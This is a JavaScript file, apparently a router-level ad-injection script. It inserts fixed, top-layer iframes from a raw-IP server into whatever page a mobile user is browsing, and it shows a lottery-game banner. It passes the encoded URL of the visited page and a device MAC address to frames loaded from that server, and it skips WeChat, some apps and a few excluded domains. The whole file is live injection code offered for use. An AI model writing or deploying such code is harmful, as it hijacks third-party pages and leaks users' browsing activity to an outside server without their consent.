(function () {

var ip = 'http://222.73.156.235:8888';
var pc = false;
var android = true;
var ios = true;
var deviceMac = 'D8:C8:E9:55:7A:10';
var statisticUrl = 'http://222.73.156.235:8888/v2/router/ad/state';
var a_str = {"top": {},"center": {},"bottom": { "height" : 64, "width" : 412, "picList" : [{"src": "http://222.73.156.235:8888/routerad/467/img/lm_抽奖_1219_1_banner-188a8289-7b20-427e-8c6c-921b27a07184.png", "landpage": "http://t.tui-8.com:7080/game/play?rsid=ded90ab84a76e702&sId=b3851ef1705e9926&stId=a4ab1d771d3f77b6&p", "statisticUrl": "http://222.73.156.235:8888/v2/router/ad/state", "materialId": "467", "taskId": "175"}]}};
    var hostUrl = '';
    // var timestamp = new Date().getTime();
    // lalala
    window.onload = function(){
        aa();
    }

    window.addEventListener('message', function(e){
        if(e.data.removeIframe == "yes"){
            document.getElementById(e.data.iframeId).remove();
        }

    }, false)

     //判断方向,resize的时候判断方向(adp-138)
    window.addEventListener("resize",function(){
          var iframe_Ct_a = document.getElementById('iframe_center_a');
          var iframe_Ct_b = document.getElementById('iframe_bottom_a');
          //中间插屏
          if(iframe_Ct_a){
             if( window.orientation == 90 || window.orientation==-90){
                  iframe_Ct_a.style.left = window.innerWidth /2 + "px";
                  iframe_Ct_a.style.top = window.innerHeight/1.2+"px";
                  iframe_Ct_a.style.marginLeft = parseInt(a_str.center.width)/2*(-1)+"px";
                  iframe_Ct_a.style.marginTop = (window.innerHeight/1.5)*(-1)+"px";
              }
            if( window.orientation == 180 || window.orientation == 0 ) {
               iframe_Ct_a.style.left = window.innerWidth /2 + "px";
               iframe_Ct_a.style.top = window.innerHeight /2 + "px";
               iframe_Ct_a.style.marginLeft = parseInt(a_str.center.width)/2*(-1)+"px";
               iframe_Ct_a.style.marginTop = parseInt(a_str.center.height)/2*(-1)+"px";
            }
          }

          //底部横幅
          if(iframe_Ct_b){
             if(window.orientation ==90 || window.orientation==-90){
                iframe_Ct_b.style.marginLeft = "25%";
             }
             if(window.orientation == 180 || window.orientation == 0){
                iframe_Ct_b.style.marginLeft = '0';
             }
          }
    });

    function aa() {

        //增加禁止域名判断
        if(forbidHost()){
            return false;
        }

        hostUrl = encodeURIComponent(top.window.location.href);
        var browser = {
            versions: function () {
                var u = navigator.userAgent, app = navigator.appVersion;
                return {
                    trident: u.indexOf('Trident') > -1, //IE内核
                    presto: u.indexOf('Presto') > -1, //opera内核
                    webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
                    gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
                    mobile: !!u.match(/AppleWebKit.*Mobile.*/) || !!u.match(/AppleWebKit/), //是否为移动终端
                    ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
                    android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
                    iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器
                    iPad: u.indexOf('iPad') > -1, //是否iPad
                    webApp: u.indexOf('Safari') == -1 //是否web应该程序，没有头部与底部
                };
            }()
        }
        if (isWeiXin() || isAPP()) {

        } else if (browser.versions.android == true) {  //只投Android
            if(android){
                //console.log("ios append iframe.");
                appendIframe();
                //console.log("ios append iframe over.");
            }
        } else if (browser.versions.ios == true || browser.versions.iPhone == true || browser.versions.iPad == true) {
            if(ios){
                //console.log("ios append iframe.");
                appendIframe();
                //console.log("ios append iframe over.")
            }
        }

        function appendIframe() {
            var dataSet = {};
            dataSet.deviceMac = deviceMac;
            dataSet.statisticUrl = statisticUrl;
            dataSet.hostUrl = hostUrl;
            dataSet.ip = ip;
            if(a_str.top.height != undefined){
                var iframe_Tp = document.createElement('iframe');
                iframe_Tp.src = ip + '/routerad/common/pages/mobile_index.html';
                iframe_Tp.id = "iframe_top_a";
                iframe_Tp.name = "iframe_top_a";
                iframe_Tp.scrolling = "no";
                iframe_Tp.display = "block";
                iframe_Tp.style.position="fixed";
                iframe_Tp.setAttribute("frameborder","0");
                iframe_Tp.style.zIndex = "2147483647";

                var iframeWidth,iframeHeight;
                iframeWidth = window.innerWidth;
                iframeHeight = parseInt(a_str.top.height) * parseInt(iframeWidth)/parseInt(a_str.top.width);

                iframe_Tp.style.width = iframeWidth + "px";
                iframe_Tp.style.height =  iframeHeight + "px";

                //iframe_Bt.style.bottom = "0px";
                iframe_Bt.style.top = "0px";
                iframe_Tp.style.left = "0px";
                window.top.document.body.appendChild(iframe_Tp);
                dataSet.picList = a_str.top.picList;
                dataSet.iframeId = "iframe_top_a";

                document.getElementById('iframe_top_a').onload=function(){
                    var ifr = document.querySelector('#iframe_top_a');
                    ifr.contentWindow.postMessage(dataSet, '*');
                }
            }

            if(a_str.bottom.height != undefined){
                //console.log("bottom iframe.");
                var iframe_Bt = document.createElement('iframe');
                iframe_Bt.src = ip + '/routerad/common/pages/mobile_index.html';
                iframe_Bt.id = "iframe_bottom_a";
                iframe_Bt.name = "iframe_bottom_a";
                iframe_Bt.scrolling = "no";
                iframe_Bt.display = "block";
                iframe_Bt.style.position="fixed";
                iframe_Bt.setAttribute("frameborder","0");
                iframe_Bt.style.zIndex = "2147483647";

                var iframeWidth,iframeHeight;
                iframeWidth = window.innerWidth;
                iframeHeight = parseInt(a_str.bottom.height) * parseInt(iframeWidth)/parseInt(a_str.bottom.width);

                iframe_Bt.style.width = iframeWidth + "px";
                iframe_Bt.style.height =  iframeHeight + "px";

                //iframe_Bt.style.top = window.innerHeight + "px";
                iframe_Bt.style.bottom = "0px";
                iframe_Bt.style.left = "0px";
                iframe_Bt.style.marginTop = iframeHeight*(-1) + "px";

                window.top.document.body.appendChild(iframe_Bt);
                dataSet.picList = a_str.bottom.picList;
                dataSet.iframeId = "iframe_bottom_a";

                document.getElementById('iframe_bottom_a').onload=function(){
                    var ifr = document.querySelector('#iframe_bottom_a');
                    ifr.contentWindow.postMessage(dataSet, '*');
                }
            }

            if(a_str.center.height != undefined){
                //console.log("center iframe.");
                var iframe_Ct = document.createElement('iframe');
                iframe_Ct.src = ip + '/routerad/common/pages/mobile_index.html';
                iframe_Ct.id = "iframe_center_a";
                iframe_Ct.name = "iframe_center_a";
                iframe_Ct.scrolling = "no";
                iframe_Ct.display = "block";
                iframe_Ct.style.position="fixed";
                iframe_Ct.setAttribute("frameborder","0");
                iframe_Ct.style.zIndex = "2147483647";

                var iframeWidth,iframeHeight;
                iframeWidth = a_str.center.width;
                iframeHeight = a_str.center.height;

                iframe_Ct.style.width = parseInt(iframeWidth) + "px";
                iframe_Ct.style.height =  parseInt(iframeHeight) + "px";
                iframe_Ct.style.left = window.innerWidth /2 + "px";
                iframe_Ct.style.top = window.innerHeight /2 + "px";
                iframe_Ct.style.marginLeft = parseInt(iframeWidth)/2*(-1)+"px";
                iframe_Ct.style.marginTop = parseInt(iframeHeight)/2*(-1)+"px";
                window.top.document.body.appendChild(iframe_Ct);

                dataSet.picList = a_str.center.picList;
                dataSet.iframeId = "iframe_center_a";

                document.getElementById('iframe_center_a').onload=function(){
                    var ifr = document.querySelector('#iframe_center_a');
                    ifr.contentWindow.postMessage(dataSet, '*');
                }
            }
        }

    }

    function isWeiXin() {
        var ua = window.navigator.userAgent.toLowerCase();
        //console.log(ua);//mozilla/5.0 (iphone; cpu iphone os 9_1 like mac os x) applewebkit/601.1.46 (khtml, like gecko)version/9.0 mobile/13b143 safari/601.1
        if (ua.match(/MicroMessenger/i) == 'micromessenger') {
            return true;
        } else {
            return false;
        }
    }

    function isAPP() {
        var ua = window.navigator.userAgent.toLowerCase();

        if (ua.indexOf("biliapp") >= 0) {
            return true;
        }
        if (ua.indexOf("wifikey") >= 0) {
            return true;
        }
        if (ua.indexOf("newsarticle") >= 0) {
            return true;
        }
        if (ua.indexOf("peanutwi-fi") >= 0) {
            return true;
        }
        if (ua.indexOf("phiwifi")>=0) {
            return true;
        }
        if (ua.indexOf("changba") >= 0) {
            return true;
        }
        if (ua.indexOf("phicare") >= 0) {
            return true;
        }
        if (ua.indexOf("momowebview") >= 0 || ua.indexOf("momokit") >= 0) {
            return true;
        } else {
            return false;
        }
    }

    //禁止显示广告的域名，后续增加多个时候可以使用数组
    function forbidHost(){
        var url = top.window.location.href;
        var reg = /phicomm\.com/g;
        var baiduReg = /m\.baidu\.com\/static/g;
        if(reg.test(url) || baiduReg.test(url)){
            return true;
        }else{
            return false;
        }
    }
})();
